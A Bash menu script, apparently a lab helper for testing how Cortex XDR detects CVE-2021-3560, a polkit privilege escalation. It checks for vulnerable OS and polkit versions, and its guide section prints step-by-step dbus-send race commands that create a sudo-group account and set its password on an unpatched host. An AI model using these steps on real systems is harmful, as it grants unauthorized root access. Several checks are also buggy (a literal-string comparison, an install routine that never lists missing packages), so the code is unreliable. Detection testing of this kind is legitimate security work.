#!/bin/bash

# --------------------------------Disclaimer--------------------------------
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
# --------------------------------Disclaimer--------------------------------

function helpmenu() { 

    clear
    echo Cortex XDR PoC ft. CVE-2021-3560
    
    echo
    echo Description:
    echo "This program is used in conjunction with the PoC writeup. It is used as a practical
    way to simply establish the lab environment necessary to exploit CVE-2021-3560 and view 
    how Cortex XDR captures such events"

    echo
    echo Options:
    echo "  1. Help: Display command information and about"
    echo 
    echo "  2. Initiate Checklist Scan: Go through checklist of pre-requisites required for exploit to
    work. Examines operating system, polkit version, package installations, a running ssh instance, the users uid permissions, 
    and a valid installation of the Cortex XDR agent."
    echo
    echo "  3. Install required packages: Looks for and install the ssh, gnome-control-center, and accountsservice packages. These are essential to run the PoC on the host. If all of the packages are installed, no further action will be taken"
    echo
    echo "  4. Guide to initiate exploit: Prints guide to initiate exploit based on information by original CVE discoverer and security researcher Kevin Backhouse. Source: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/"
    
    echo
    returning

}

function checklist() {
    #os version, polkit version, account service, gnome control center, ssh installated Cortex XDR Agent Installed, final check

    clear 

    echo Checking OS release...
    sleep 3
    #distinguish Ubuntu/Debian or RHEL/CentOS/Fedora
    os=$(sed -n '3p' /etc/os-release)

    declare -a PrettyNamesApt=("Ubuntu Focal Fossa (development branch)" "Debian testing (\"bullseye\")" "Ubuntu 20.04 LTS")
    PrettyNamesYum="Red Hat Enterprise Linux 8.0 (Ootpa) CentOS Linux 8"
    
    declare -a VulnPolkitList=("0.113" "0.105-26" "0.105-26ubuntu1.3" "0.115")

    #pnf=$(grep "PRETTY_NAME" /etc/os-release)
    PrettyNameCut=$(hostnamectl | grep "Operating" | awk '{ print substr($0, index($0,$3)) }')

    echo Checking polkit version...
    sleep 2
    VulnPolkitList="0.113 0.105-26 0.105-26ubuntu1.3"; #Load up vulnerable deb version as well to expand list
    PolkitVHost=$(dpkg -l | grep polkit-agent | awk '{print$3}')
    
    echo Searching for required packages...
    sleep 3

    RequiredPackages="accountsservice ssh gnome-control-center"
    CheckForPacks=$(apt list --installed &>/dev/null | tail -1)
    
    #check for cortex xdr
    echo Searching for the Cortex XDR agent...
    sleep 3
    
    xdrcheck=$(grep cortexuser /etc/passwd)

    yes=$(echo -e "\e[32m+\e[0m")
    no=$(echo -e "\e[31mX\e[0m")
    Results=""
    
    #Check for local privilege to ensure script isn't running as regular user
    uid=$(id -u)
	if [[ $uid -eq 0 ]]; then
	    Results+="[$no] The current user has root privileges (PoC will always work). Please reboot and non-root user\n"
	else
	    Results+="[$yes] A nonroot user is running the script\n"
	fi  
	
    #Ubuntu/Debian path
    if  [[ $os == "ID=ubuntu" || $os == "ID=debian" ]];
    then
        #OS Version Check

    	for osv in "${PrettyNamesApt[@]}"; do
    	   if [[ $PrettyNameCut == $osv ]]; then
    		Results+="[$yes] The current Operating System $PrettyNameCut ships with a vulnerable version of polkit\n"
    	   fi
        done
    
    	if [[ Results == "" ]]; then
    	    Results+="[$no] The current Operating System $PrettyNameCut does not ship with a vulnerable version of polkit\n"
    	fi
    
    	#Polkit Check

    	for pkv in "${VulnPolkitList[@]}"; do
    	   if [[ $PolkitVHost == $pkv ]]; then
    		Results+="[$yes] The current polkit version $PolkitVHost is vulnerable\n"
    	   fi
        done
    
    	if [[ ${#Results} -lt 120 ]]; then
    	    Results+="[$no] The current Operating System $PrettyNameCut does not ship with a vulnerable version of polkit\n"
    	fi
        #Check if other packages are installed 
        
        for packs in $RequiredPackages; do

            packcheck=$(dpkg -l | grep $packs)
            if [[ -z $packcheck ]]; then
                 Results+="[$no] The package $packs is not installed\n"
            else
                Results+="[$yes] The package $packs is installed\n"
            fi
        done
        
        echo Checking instance information...
        sleep 2
        
        #Check if being ran within local ssh instance
        sshcheck=$(last | grep "logged in")
        
        if [[ -z $sshcheck ]]; then
        	Results+="[$no] The script is currently not being ran in an ssh instance\n"
        else
        	Results+="[$yes] The script is currently being ran in an ssh instance\n" 
        fi

        #Check for Cortex XDR agent installed

        if [[ -z $xdrcheck ]]; then
            Results+="[$no] The Cortex XDR agent is not currently installed on the local host.\n"
        else
            Results+="[$yes] The Cortex XDR agent is currently installed and running\n"
        fi
        
        echo
        echo -e $Results
        returning
    fi
}

function installpacks() {

    RequiredPackages="accountsservice ssh gnome-control-center"
    CheckForPacks=$(apt list --installed &>/dev/null | tail -1)

    Results=""
    for packs in $RequiredPackages; do
	packcheck=$(dpkg -l | grep $packs)
        if [[ -z $packcheck ]]; then
            Results+="$packcheck"
        fi
    done
    
    if [[ -z $Results ]]; then
    	echo "Congratulations, you have all the required packages already installed!"
    	returning
    else
    	read -p "The following packages are missing: $Results, would you like to install them? (y/n)" yn
    	case $yn in
    	
    		y)
    		     apt-get install $Results -y
    		     echo
    		     echo "Packages sucessfully installed"
    		     break;;
    		
    		n)
    		     returning
    		     break;;
    		*)
    		     echo "Error: invalid input. Exitting..."
    		     returning
    		     break;;
   	esac
    		     
    fi
}

function guide() {

    clear
    echo "Ensure checklist requirements are met aside from XDR agent being installed (which is necessary for testing on the tenant)."
    echo 
    
    echo "Now, prepare a username and password you plan to insert for the exploit. The username can be any valid Linux Username. The password can also be any valid password, but it must be hashed with openssl. This can be done with the following command: "
    echo
    echo "openssl passwd -5 evilsecurepassword"
    
    echo 
    echo "For example, I can choose my username to be: mf-eviladmin"
    echo -e "And I can choose my password to be the hashed version of evilsecurepassword: \$5\$1.cYmW2LCLptSJ5h\$SP4UMl7VIqidgMKle3maVsdHBTTcodj58xHsTMAfic6"
    echo
    
    
    echo -e "Now, enter the following command and place your desired username where I placed mine in the strings. The first string is the username and the second string is the full name:"
    echo -e "time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:mf-eviladmin string:mf-eviladmin int32:1"
    echo

    echo "Take the time that this command gives you and divide it by two. Lets say, for example, if this gave me a time of 0.016s, I would need to remember the time of 0.008s for the next command"
    
    echo "Then, enter the following command: "
    echo
    echo -e "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:mf-eviladmin string:mf-eviladmin  int32:1 & sleep 0.008s ; kill $!"
    echo
    
    echo -e "The username will remain in the same position. This time, we are also implementing the sleep and kill commands at the end. The number after sleep is where your time goes"
    
    echo
    echo -e "This will most likely take several tries. You will know if the insertion was successful with the id command."
    
    echo
    echo -e "Example successful id command: " 
    echo -e ">id mf-eviladmin"
    echo -e "uid=1003(mf-eviladmin) gid=1003(mf-eviladmin) groups=1003(mf-eviladmin),27(sudo)"
    
    echo
    echo -e "Next, enter this command to insert the password: "
    echo -e "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.008s ; kill $!"
    
    echo
    echo -e "Again, the time goes after the sleep command. For this entry, the part of the command that says User1002 represents the uid of the user that is being added. Check with the id command the user that was inserted and what their proper uid is and replace it with that number. The hashed password we selected is also replaced in the first string of the command. The second string does not matter, so leave it at GoldenEye."
    echo
    echo -e "After a couple more tries, you should be able to switch users with the su command and enter in the original password. If you can't log in yet, try the prior command several more times"
    
    
    returning


}

function returning() {

    read -p "Return to main menu --->"
    clear
}

clear

while true; do
    echo
    echo -e "\e[32m   ▄▄█▀▀▀█▄█                  ██                        ▀███▀   ▀██▀▀███▀▀▀██▄ ▀███▀▀▀██▄  
▄██▀     ▀█                  ██                          ███▄  ▄█    ██    ▀██▄ ██   ▀██▄ 
██▀       ▀ ▄██▀██▄▀███▄█████████  ▄▄█▀██▀██▀   ▀██▀      ▀██▄█▀     ██     ▀██ ██   ▄██  
██         ██▀   ▀██ ██▀ ▀▀  ██   ▄█▀   ██ ▀██ ▄█▀          ███      ██      ██ ███████   
██▄        ██     ██ ██      ██   ██▀▀▀▀▀▀   ███          ▄█▀▀██▄    ██     ▄██ ██  ██▄   
▀██▄     ▄▀██▄   ▄██ ██      ██   ██▄    ▄ ▄█▀ ██▄       ▄█   ▀██▄   ██    ▄██▀ ██   ▀██▄ 
  ▀▀█████▀  ▀█████▀▄████▄    ▀████ ▀█████▀██▄   ▄██▄   ▄██▄▄  ▄▄███▄████████▀ ▄████▄ ▄███▄\e[0m"

    echo
    echo PoC ft. CVE-2021-3560
    echo
    echo -e "1. Help\n2. Initiate Checklist Scan\n3. Install required packages\n4. Guide to initiate exploit\nq. Quit\n"
    read -p "Please enter an input: " choice

    case $choice in

        1) 
            helpmenu
            ;;

        2)
            checklist
            ;;
        3)
            installpacks
            ;;

        4)
            guide  
            ;;
        
        q)
            echo Goodbye! Exiting...
            exit
            ;;
        *)
            clear
            echo "Error: invalid input $choice"
            ;;
    esac
done